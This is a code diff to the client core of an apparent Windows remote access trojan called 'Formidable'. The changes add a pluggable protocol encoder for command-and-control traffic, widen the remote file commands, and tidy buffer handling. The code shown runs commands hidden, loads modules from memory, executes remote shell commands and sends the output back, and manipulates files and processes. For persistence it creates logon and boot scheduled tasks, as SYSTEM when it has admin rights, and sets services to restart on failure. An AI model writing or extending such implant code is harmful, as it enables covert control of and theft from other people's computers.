@@ -1,5 +1,7 @@
 ﻿#include "ClientCore.h"
 #include "Utils.h"
+#include "ProtocolEncoder.h"
+#include "NetworkHelper.h"
 
 // 只有在非 DLL 模块编译时才包含 Logger，或者在 DLL 模块中禁用日志
 #ifndef FORMIDABLE_MODULE_DLL
@@ -25,6 +27,7 @@
 #pragma comment(lib, "urlmon.lib")
 
 namespace Formidable {
+    ProtocolEncoder* g_pProtocolEncoder = nullptr;
 
     // 全局变量定义
     CONNECT_ADDRESS g_ServerConfig = DEFAULT_CONFIG;
@@ -42,7 +45,7 @@ namespace Formidable {
     CRITICAL_SECTION g_SendMutex;
     
     // 隐藏执行命令
-    void RunCommandSilently(const std::wstring& cmd) {
+    static void RunCommandSilently(const std::wstring& cmd) {
         STARTUPINFOW si = { sizeof(si) };
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
@@ -54,7 +57,7 @@ namespace Formidable {
     }
 
     // 安全调用模块入口
-    void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
+    static void SafeCallModuleEntry(PFN_MODULE_ENTRY pEntry, SOCKET s, CommandPkg* pkg) {
         __try {
             pEntry(s, pkg);
         }
@@ -67,7 +70,7 @@ namespace Formidable {
     }
 
     // 尝试获取导出函数 (兼容 x86 stdcall 修饰名)
-    FARPROC TryGetProcAddress(HMEMORYMODULE hMod, const char* name, int argSize) {
+    static FARPROC TryGetProcAddress(HMEMORYMODULE hMod, const char* name, int argSize) {
         FARPROC p = MemoryGetProcAddress(hMod, name);
         if (p) return p;
 #ifdef _X86_
@@ -169,14 +172,13 @@ namespace Formidable {
         strncpy(info.uptime, GetSystemUptime().c_str(), sizeof(info.uptime) - 1);
     }
 
+    static ProtocolEncoder* GetEncoder() {
+        return g_pProtocolEncoder;
+    }
+
     void SendPkg(SOCKET s, const void* data, int len) {
         EnterCriticalSection(&g_SendMutex);
-        PkgHeader header;
-        memcpy(header.flag, "FRMD26?", 7);
-        header.originLen = len;
-        header.totalLen = sizeof(PkgHeader) + len;
-        send(s, (char*)&header, sizeof(PkgHeader), 0);
-        send(s, (char*)data, len, 0);
+        SendRawPkg(s, data, len, g_pProtocolEncoder);
         LeaveCriticalSection(&g_SendMutex);
     }
 
@@ -194,13 +196,19 @@ namespace Formidable {
             case CMD_FILE_DOWNLOAD:
             case CMD_FILE_DOWNLOAD_DIR:
             case CMD_FILE_UPLOAD:
+            case CMD_FILE_DATA:
             case CMD_FILE_DELETE:
             case CMD_FILE_RENAME:
             case CMD_FILE_RUN:
-        case CMD_FILE_MONITOR:
-        case CMD_FILE_PREVIEW:
-        case CMD_FILE_HISTORY:
-        case CMD_FILE_PERF:
+            case CMD_FILE_MKDIR:
+            case CMD_FILE_SIZE:
+            case CMD_FILE_SEARCH:
+            case CMD_FILE_COMPRESS:
+            case CMD_FILE_UNCOMPRESS:
+            case CMD_FILE_MONITOR:
+            case CMD_FILE_PREVIEW:
+            case CMD_FILE_HISTORY:
+            case CMD_FILE_PERF:
                 return CMD_FILE_LIST;
             case CMD_SERVICE_LIST:
             case CMD_SERVICE_START:
@@ -310,7 +318,7 @@ namespace Formidable {
     }
 
     // 搜索文件辅助函数
-    void SearchFiles(const std::wstring& dir, const std::wstring& pattern, std::string& result, int& count) {
+    static void SearchFiles(const std::wstring& dir, const std::wstring& pattern, std::string& result, int& count) {
         if (count > 1000) return; // 限制结果数量
 
         WIN32_FIND_DATAW findData;
@@ -392,8 +400,8 @@ namespace Formidable {
                             NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
                             
                         if (hDir != INVALID_HANDLE_VALUE) {
-                            char notifyBuf[1024];
-                            DWORD bytesReturned;
+                            char notifyBuf[1024] = { 0 };
+                            DWORD bytesReturned = 0; // Initialize bytesReturned
                             while (true) {
                                 if (ReadDirectoryChangesW(hDir, notifyBuf, sizeof(notifyBuf), TRUE, 
                                     FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE, 
@@ -457,11 +465,11 @@ namespace Formidable {
                 break;
             case CMD_POWER_SHUTDOWN:
                 EnableDebugPrivilege();
-                ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+                InitiateSystemShutdownExW(NULL, NULL, 0, TRUE, FALSE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
                 break;
             case CMD_POWER_REBOOT:
                 EnableDebugPrivilege();
-                ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+                InitiateSystemShutdownExW(NULL, NULL, 0, TRUE, TRUE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
                 break;
             case CMD_POWER_LOGOUT:
                 ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
@@ -528,9 +536,12 @@ namespace Formidable {
             }
             case CMD_SET_GROUP: {
                 int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
-                if (dataLen > 0 && dataLen < 128) {
+                if (dataLen > 0) {
+                    // C6386: Ensure we don't overflow the szGroupName buffer (24 bytes)
+                    // The struct definition in Config.h is: char szGroupName[24];
                     std::string groupName(pkg->data, dataLen);
-                    strncpy(g_ServerConfig.szGroupName, groupName.c_str(), 127);
+                    strncpy(g_ServerConfig.szGroupName, groupName.c_str(), sizeof(g_ServerConfig.szGroupName) - 1);
+                    g_ServerConfig.szGroupName[sizeof(g_ServerConfig.szGroupName) - 1] = '\0'; // Ensure null-termination
                 }
                 break;
             }
@@ -641,7 +652,20 @@ namespace Formidable {
             case CMD_GET_SYSINFO:
             case CMD_FILE_LIST:
             case CMD_DRIVE_LIST:
+            case CMD_FILE_DOWNLOAD:
             case CMD_FILE_DOWNLOAD_DIR:
+            case CMD_FILE_UPLOAD:
+            case CMD_FILE_DATA:
+            case CMD_FILE_DELETE:
+            case CMD_FILE_RENAME:
+            case CMD_FILE_RUN:
+            case CMD_FILE_MKDIR:
+            case CMD_FILE_SIZE:
+            case CMD_FILE_COMPRESS:
+            case CMD_FILE_UNCOMPRESS:
+            case CMD_FILE_PREVIEW:
+            case CMD_FILE_HISTORY:
+            case CMD_FILE_PERF:
             case CMD_PROCESS_LIST:
             case CMD_PROCESS_KILL:
             case CMD_PROCESS_MODULES:
@@ -674,20 +698,9 @@ namespace Formidable {
                     std::string cmd(pkg->data, dataLen);
                     std::string output = ExecuteCmdAndGetOutput(cmd);
                     
-                    size_t respSize = sizeof(CommandPkg) - 1 + output.size();
-                    std::vector<char> respBuf(sizeof(PkgHeader) + respSize);
-                    PkgHeader* h = (PkgHeader*)respBuf.data();
-                    memcpy(h->flag, "FRMD26?", 7);
-                    h->originLen = (int)respSize;
-                    h->totalLen = (int)respBuf.size();
-                    
-                    CommandPkg* p = (CommandPkg*)(respBuf.data() + sizeof(PkgHeader));
-                    p->cmd = CMD_EXEC_GET_OUTPUT;
-                    p->arg1 = (uint32_t)output.size();
-                    p->arg2 = 0;
-                    memcpy(p->data, output.data(), output.size());
-                    
-                    send(s, respBuf.data(), (int)respBuf.size(), 0);
+                    if (!output.empty()) {
+                        SendPkg(s, CMD_EXEC_GET_OUTPUT, output.data(), (int)output.size(), (uint32_t)output.size(), 0, g_pProtocolEncoder);
+                    }
                 }
                 break;
             }
@@ -697,9 +710,14 @@ namespace Formidable {
     void HandleConnection(ConnectionContext* ctx) {
         ctx->bConnected->store(true);
         LOG_INFO("Connected to " + ctx->serverIp);
+        
+        // 设置全局编码器
+        if (g_pProtocolEncoder) delete g_pProtocolEncoder;
+        g_pProtocolEncoder = GetEncoderByType(g_ServerConfig.iHeaderEnc);
+
         ClientInfo info;
         GetClientInfo(info);
-        SendPkg(ctx->s, &info, sizeof(ClientInfo));
+        SendPkg(ctx->s, CMD_HEARTBEAT, &info, sizeof(ClientInfo), sizeof(ClientInfo), 0, g_pProtocolEncoder);
         
         // Heartbeat task via AutomationManager
         int hbTaskId = Formidable::Client::Core::AutomationManager::AddTask([ctx]() {
@@ -707,49 +725,53 @@ namespace Formidable {
             
             ClientInfo hbInfo;
             GetClientInfo(hbInfo);
-            
-            size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
-            std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
-            PkgHeader* h = (PkgHeader*)hbBuf.data();
-            memcpy(h->flag, "FRMD26?", 7);
-            h->originLen = (int)hbBodySize;
-            h->totalLen = (int)hbBuf.size();
-            
-            CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
-            p->cmd = CMD_HEARTBEAT;
-            p->arg1 = sizeof(ClientInfo);
-            p->arg2 = 0;
-            memcpy(p->data, &hbInfo, sizeof(ClientInfo));
-            
-            send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0);
+            SendPkg(ctx->s, CMD_HEARTBEAT, &hbInfo, sizeof(ClientInfo), sizeof(ClientInfo), 0, g_pProtocolEncoder);
         }, 5000);
 
+        int flagLen = g_pProtocolEncoder->GetFlagLen();
+        int headLen = g_pProtocolEncoder->GetHeadLen();
+        std::string head = g_pProtocolEncoder->GetHead();
+
         while (!ctx->bShouldExit->load()) {
-            PkgHeader header;
-            int n = recv(ctx->s, (char*)&header, sizeof(PkgHeader), 0);
+            std::vector<char> hBuf(headLen);
+            int n = recv(ctx->s, hBuf.data(), headLen, 0);
             if (n <= 0) break;
-            if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
-            std::vector<char> body(header.originLen);
+            
+            if (memcmp(hBuf.data(), head.c_str(), flagLen) != 0) break;
+
+            int totalPkgLen = *(int*)(hBuf.data() + flagLen);
+            int originLen = *(int*)(hBuf.data() + flagLen + sizeof(int));
+            int bodyLen = totalPkgLen - headLen;
+
+            std::vector<char> body(bodyLen);
             int total = 0;
-            while (total < header.originLen) {
-                int r = recv(ctx->s, body.data() + total, header.originLen - total, 0);
+            while (total < bodyLen) {
+                int r = recv(ctx->s, body.data() + total, bodyLen - total, 0);
                 if (r <= 0) break;
                 total += r;
             }
-            if (total == header.originLen) {
-                HandleCommand(ctx->s, (CommandPkg*)body.data(), header.originLen);
+            if (total == bodyLen) {
+                g_pProtocolEncoder->Decode((unsigned char*)body.data(), bodyLen);
+                HandleCommand(ctx->s, (CommandPkg*)body.data(), bodyLen);
             } else break;
         }
         
         ctx->bConnected->store(false);
         Formidable::Client::Core::AutomationManager::RemoveTask(hbTaskId);
+        if (g_pProtocolEncoder) {
+            delete g_pProtocolEncoder;
+            g_pProtocolEncoder = nullptr;
+        }
         LOG_WARNING("Disconnected");
     }
 
     void RunClientLoop(std::atomic<bool>& bShouldExit, std::atomic<bool>& bConnected) {
         while (!bShouldExit) {
             WSADATA wsaData;
-            WSAStartup(MAKEWORD(2, 2), &wsaData);
+            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+                Sleep(5000);
+                continue;
+            }
 
             std::string rawServerIps = g_ServerConfig.szServerIP;
             if (g_ServerConfig.bEncrypt) {
@@ -788,7 +810,7 @@ namespace Formidable {
                 int port = atoi(g_ServerConfig.szPort);
                 std::string serverPort = g_ServerConfig.szPort;
 
-                sockaddr_in addr;
+                sockaddr_in addr = { 0 };
                 addr.sin_family = AF_INET;
                 addr.sin_port = htons(port);
                 inet_pton(AF_INET, serverIp.c_str(), &addr.sin_addr);
@@ -920,10 +942,10 @@ namespace Formidable {
                     taskName = taskName.substr(0, taskName.length() - 4);
                 }
             }
-
-            const size_t xmlSize = 4096;
-            wchar_t szTaskXml[xmlSize];
-            swprintf_s(szTaskXml, xmlSize,
+            
+            // 使用 vector 代替栈上的大数组
+            std::vector<wchar_t> szTaskXml(4096);
+            swprintf_s(szTaskXml.data(), 4096,
                 L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
                 L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
                 L"<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>"
@@ -940,16 +962,16 @@ namespace Formidable {
             if (fp) {
                 unsigned short bom = 0xFEFF;
                 fwrite(&bom, sizeof(bom), 1, fp);
-                fwrite(szTaskXml, sizeof(wchar_t), wcslen(szTaskXml), fp);
+                fwrite(szTaskXml.data(), sizeof(wchar_t), wcslen(szTaskXml.data()), fp);
                 fclose(fp);
                 
-                wchar_t szCmd[4096];
+                std::vector<wchar_t> szCmd(4096);
                 if (IsAdmin()) {
-                    swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f /ru SYSTEM", taskName.c_str(), szTempXml);
+                    swprintf_s(szCmd.data(), 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f /ru SYSTEM", taskName.c_str(), szTempXml);
                 } else {
-                    swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f", taskName.c_str(), szTempXml);
+                    swprintf_s(szCmd.data(), 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f", taskName.c_str(), szTempXml);
                 }
-                RunCommandSilently(szCmd);
+                RunCommandSilently(szCmd.data());
                 DeleteFileW(szTempXml);
             }
         }
@@ -978,6 +1000,7 @@ namespace Formidable {
                     if (hService) {
                         SERVICE_FAILURE_ACTIONS fa = { 0 };
                         SC_ACTION actions[3];
+                        memset(actions, 0, sizeof(actions)); // Initialize actions
                         actions[0].Type = actions[1].Type = actions[2].Type = SC_ACTION_RESTART;
                         actions[0].Delay = actions[1].Delay = actions[2].Delay = 60000;
                         fa.dwResetPeriod = 86400;
